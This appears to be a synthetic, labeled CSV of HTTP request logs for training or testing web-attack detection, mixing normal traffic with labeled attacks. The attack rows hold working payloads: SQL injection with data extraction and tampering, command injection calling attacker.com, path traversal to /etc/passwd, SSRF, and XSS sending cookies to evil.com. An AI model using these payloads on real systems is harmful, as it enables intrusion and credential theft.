timestamp,source_ip,destination_ip,protocol,http_method,url,request_headers,request_body,response_code,response_size,response_headers,user_agent,payload_raw,attack_type_label,hour,day_of_week,is_weekend,is_attack,parsed_request_headers,parsed_response_headers,Host,User-Agent,Accept,Content-Type,Server
2026-03-15 07:44:55,172.16.0.177,198.51.100.23,http,get,/ping?ip=127.0.0.1&& curl http://attacker.com,"{""Host"":""3.12.45.78"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,404,6210,"{""Content-Type"":""text/html"",""Server"":""nginx""}",BurpSuite/2023.12,&& curl http://attacker.com,command_injection,7,6,1,1,"{'Host': '3.12.45.78', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",3.12.45.78,BurpSuite/2023.12,*/*,text/html,nginx
2026-03-11 02:34:48,192.168.1.166,203.0.113.45,https,get,"/login?user=' and updatexml(1,concat(0x7e,version()),1)--","{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,302,7550,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,"' and updatexml(1,concat(0x7e,version()),1)--",sql_injection,2,2,0,1,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",192.168.1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-12 13:17:45,10.0.0.157,185.199.108.153,https,get,/ping?ip=127.0.0.1; sleep 10,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,403,555,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,; sleep 10,command_injection,13,3,0,1,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",203.0.113.45,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-12 09:21:53,185.199.108.136,34.120.45.67,https,post,/login,"{""Host"":""3.12.45.78"",""User-Agent"":""Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",comment=Great article!,200,3661,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,,normal,9,3,0,0,"{'Host': '3.12.45.78', 'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",3.12.45.78,Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,nginx
2026-03-17 11:58:58,10.0.0.59,185.199.108.153,https,get,"/search?q=' and load_file(concat('\\',database(),'.attacker.com\'))--","{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,404,3389,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,"' and load_file(concat('\\',database(),'.attacker.com\'))--",sql_injection,11,1,0,1,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",172.67.128.45,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,IIS
2026-03-12 05:46:18,192.168.1.54,172.67.128.45,https,post,/login,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",username=alice&password=password123,302,7987,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,username=alice&password=password123,credential_stuffing_brute_force,5,3,0,1,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",198.51.100.23,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,nginx
2026-03-22 18:37:33,10.0.0.91,104.18.24.12,https,get,/products,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,200,4087,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,,normal,18,6,1,0,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",10.0.0.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,Apache
2026-03-18 21:06:07,172.67.128.225,3.12.45.78,https,get,/view?path=../../../../etc/passwd%00.html,"{""Host"":""104.18.24.12"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,500,2848,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Nikto/2.5.0,../../../../etc/passwd.html,directory_traversal,21,2,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",104.18.24.12,Nikto/2.5.0,*/*,text/html,IIS
2026-03-23 20:16:08,104.18.24.194,203.0.113.45,http,get,/download?file=..%255c..%255c..%255cwindows%255cwin.ini,"{""Host"":""185.199.108.153"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,401,1082,"{""Content-Type"":""text/html"",""Server"":""IIS""}",BurpSuite/2023.12,..%5c..%5c..%5cwindows%5cwin.ini,directory_traversal,20,0,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",185.199.108.153,BurpSuite/2023.12,*/*,text/html,IIS
2026-03-16 05:03:31,192.168.1.115,104.18.24.12,http,get,"/user?username=' and extractvalue(1,concat(0x7e,database()))--","{""Host"":""192.168.1.1"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,302,5229,"{""Content-Type"":""text/html"",""Server"":""nginx""}",XSStrike/3.1.5,"' and extractvalue(1,concat(0x7e,database()))--",sql_injection,5,0,0,1,"{'Host': '192.168.1.1', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",192.168.1.1,XSStrike/3.1.5,*/*,text/html,nginx
2026-03-22 16:30:53,185.199.108.141,198.51.100.23,http,get,https://facebok.com/login?redirect=/dashboard,"{""Host"":""34.120.45.67"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",,200,1169,"{""Content-Type"":""text/html"",""Server"":""nginx""}",SQLmap/1.8.4,facebok.com,typosquatting_url_spoofing,16,6,1,1,"{'Host': '34.120.45.67', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",34.120.45.67,SQLmap/1.8.4,*/*,text/html,nginx
2026-03-05 12:15:06,192.168.1.253,104.18.24.12,http,post,/comment,"{""Host"":""3.12.45.78"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",comment=%3Csvg%20onload%3Dalert%28document.cookie%29%3E,401,831,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,<svg onload=alert(document.cookie)>,xss,12,3,0,1,"{'Host': '3.12.45.78', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",3.12.45.78,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,nginx
2026-03-18 18:04:35,104.18.24.134,104.18.24.12,https,post,/blog?product=2,"{""Host"":""3.12.45.78"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",email=user@example.com&subscribe=true,301,4242,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,,normal,18,2,0,0,"{'Host': '3.12.45.78', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",3.12.45.78,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,Apache
2026-03-19 20:49:53,192.168.1.235,185.199.108.153,https,post,/login,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",username=bob&password=Spring2024,401,5003,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,username=bob&password=spring2024,credential_stuffing_brute_force,20,3,0,1,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",192.168.1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,Apache
2026-03-23 06:54:04,172.67.128.176,3.12.45.78,http,get,/proxy?target=http://127.0.0.1.nip.io,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,200,3830,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,http://127.0.0.1.nip.io/,ssrf,6,0,0,1,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",198.51.100.23,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,Apache
2026-03-06 04:08:48,10.0.0.106,198.51.100.23,https,get,https://amzon.com/login?redirect=/dashboard,"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,403,2674,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,amzon.com,typosquatting_url_spoofing,4,4,0,1,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",34.120.45.67,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,nginx
2026-03-23 05:09:59,192.168.1.37,104.18.24.12,https,post,/login,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",login=test&pass=password,200,6220,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,login=test&pass=password,credential_stuffing_brute_force,5,0,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",10.0.0.1,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,nginx
2026-03-06 04:39:22,172.16.0.70,52.45.123.89,https,get,/products?product=laptop,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",,404,2600,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,4,4,0,0,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",185.199.108.153,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,Apache
2026-03-09 01:40:50,10.0.0.53,203.0.113.45,http,get,/view?path=../../../etc/passwd%00.png,"{""Host"":""104.18.24.12"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,401,722,"{""Content-Type"":""text/html"",""Server"":""Apache""}",XSStrike/3.1.5,../../../etc/passwd.png,directory_traversal,1,0,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,XSStrike/3.1.5,*/*,text/html,Apache
2026-03-17 16:12:52,10.0.0.92,10.0.0.1,http,get,/contact,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,301,1531,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,,normal,16,1,0,0,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",10.0.0.1,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Cloudflare
2026-03-08 09:40:17,192.168.1.173,185.199.108.153,https,get,/search?q='; update users set password='hacked' where username='admin'--,"{""Host"":""104.18.24.12"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,200,4779,"{""Content-Type"":""text/html"",""Server"":""Apache""}",XSStrike/3.1.5,'; update users set password='hacked' where username='admin'--,sql_injection,9,6,1,1,"{'Host': '104.18.24.12', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,XSStrike/3.1.5,*/*,text/html,Apache
2026-03-20 19:58:30,104.18.24.228,192.168.1.1,http,get,/login?product=product1,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",,200,552,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,19,4,0,0,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",198.51.100.23,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,Cloudflare
2026-03-10 08:43:41,192.168.1.110,34.120.45.67,https,get,/download/file.pdf?limit=home,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",,200,2884,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,,normal,8,1,0,0,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",198.51.100.23,Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,*/*,text/html,Cloudflare
2026-03-06 04:04:45,192.168.1.205,34.120.45.67,https,get,/search,"{""Host"":""10.0.0.1"",""User-Agent"":""python-requests/2.28.0"",""Accept"":""*/*""}",,200,973,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",python-requests/2.28.0,,normal,4,4,0,0,"{'Host': '10.0.0.1', 'User-Agent': 'python-requests/2.28.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",10.0.0.1,python-requests/2.28.0,*/*,text/html,Cloudflare
2026-03-21 15:48:50,172.16.0.172,192.168.1.1,http,post,/login,"{""Host"":""172.67.128.45"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",username=bob&password=Spring2024,403,2312,"{""Content-Type"":""text/html"",""Server"":""nginx""}",BurpSuite/2023.12,username=bob&password=spring2024,credential_stuffing_brute_force,15,5,1,1,"{'Host': '172.67.128.45', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,BurpSuite/2023.12,*/*,text/html,nginx
2026-03-13 03:23:53,172.16.0.141,172.67.128.45,https,get,/products,"{""Host"":""3.12.45.78"",""User-Agent"":""wget/1.21.2"",""Accept"":""*/*""}",,200,3560,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",wget/1.21.2,,normal,3,4,0,0,"{'Host': '3.12.45.78', 'User-Agent': 'wget/1.21.2', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",3.12.45.78,wget/1.21.2,*/*,text/html,Cloudflare
2026-03-20 02:31:21,198.51.100.58,185.199.108.153,https,get,/download?file=../../../../var/log/apache/access.log,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,500,4440,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,../../../../var/log/apache/access.log,directory_traversal,2,4,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",185.199.108.153,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-11 07:14:51,10.0.0.30,192.168.1.1,http,get,/login?user='; insert into logs values('hacked')--,"{""Host"":""198.51.100.23"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,404,6229,"{""Content-Type"":""text/html"",""Server"":""Apache""}",XSStrike/3.1.5,'; insert into logs values('hacked')--,sql_injection,7,2,0,1,"{'Host': '198.51.100.23', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",198.51.100.23,XSStrike/3.1.5,*/*,text/html,Apache
2026-03-13 11:35:58,104.18.24.198,52.45.123.89,http,get,https://facebook.org/login?redirect=/dashboard,"{""Host"":""52.45.123.89"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,200,259,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Nikto/2.5.0,facebook.org,typosquatting_url_spoofing,11,4,0,1,"{'Host': '52.45.123.89', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",52.45.123.89,Nikto/2.5.0,*/*,text/html,IIS
2026-03-05 19:31:20,192.168.1.112,185.199.108.153,https,get,"/search?q=prompt('enter your password:', 'password')","{""Host"":""172.67.128.45"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,200,4545,"{""Content-Type"":""text/html"",""Server"":""IIS""}",BurpSuite/2023.12,"prompt('enter your password:', 'password')",xss,19,3,0,1,"{'Host': '172.67.128.45', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",172.67.128.45,BurpSuite/2023.12,*/*,text/html,IIS
2026-03-07 15:31:41,185.199.108.68,203.0.113.45,https,get,/home?page=product1,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",,200,2323,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,,normal,15,5,1,0,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",192.168.1.1,Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,*/*,text/html,Cloudflare
2026-03-20 20:49:31,172.16.0.241,185.199.108.153,http,get,/blog,"{""Host"":""3.12.45.78"",""User-Agent"":""curl/7.81.0"",""Accept"":""*/*""}",,302,1361,"{""Content-Type"":""text/html"",""Server"":""nginx""}",curl/7.81.0,,normal,20,4,0,0,"{'Host': '3.12.45.78', 'User-Agent': 'curl/7.81.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",3.12.45.78,curl/7.81.0,*/*,text/html,nginx
2026-03-03 23:44:49,172.16.0.203,203.0.113.45,https,post,/settings?user=laptop,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",email=user@example.com&subscribe=true,200,4633,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,,normal,23,1,0,0,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",172.67.128.45,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Cloudflare
2026-03-01 06:34:50,192.168.1.78,3.12.45.78,http,post,/comment,"{""Host"":""172.67.128.45"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",comment=%3Cscript%3Efetch%28%27https%3A//evil.com/steal%3Fcookie%3D%27%2Bdocument.cookie%29%3C/script%3E,403,4454,"{""Content-Type"":""text/html"",""Server"":""Apache""}",XSStrike/3.1.5,<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>,xss,6,6,1,1,"{'Host': '172.67.128.45', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,XSStrike/3.1.5,*/*,text/html,Apache
2026-03-02 10:17:46,172.67.128.163,185.199.108.153,http,post,/contact,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",comment=Great article!,200,1264,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,,normal,10,0,0,0,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-10 10:08:21,192.168.1.42,10.0.0.1,http,get,"/login?user=' and substring(database(),1,1)='a'--","{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,2515,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,"' and substring(database(),1,1)='a'--",sql_injection,10,1,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",104.18.24.12,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,IIS
